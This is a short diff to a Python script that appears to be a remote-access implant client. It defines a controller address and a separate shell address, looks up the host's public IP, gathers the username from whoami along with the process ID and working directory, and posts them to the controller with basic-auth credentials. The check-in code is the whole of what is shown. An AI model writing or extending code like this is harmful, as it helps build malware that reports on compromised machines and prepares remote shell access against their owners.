@@ -19,17 +19,17 @@ def waiting(s=None, creds=()):
 ip, port = ("192.168.0.12", 8000)
 shell_addr = ("192.168.0.12", 8081)
 
-os.system('chcp 65001')
+# os.system('chcp 65001')
+subprocess.getoutput('chcp 65001')
+
 client_ip = get("http://api.ipify.org").text
 data = {"user": subprocess.getoutput('whoami'), 'pid': str(os.getpid()), 'pwd': str(os.getcwd()), 'ip': client_ip}
 
 url = 'http://' + ip + ':' + str(port) + '/'
+# c_len = len(data.get('user')) + len(data.get('pid')) + len(data.get('pwd')) + 10
+creds = ('user', 'pass')
 
-
-
-c_len = len(data.get('user')) + len(data.get('pid')) + len(data.get('pwd')) + 10
-
-try: requests.post(url, data=data)
+try: requests.post(url, data=data, auth=creds)
 except: pass
 
 time.sleep(1)
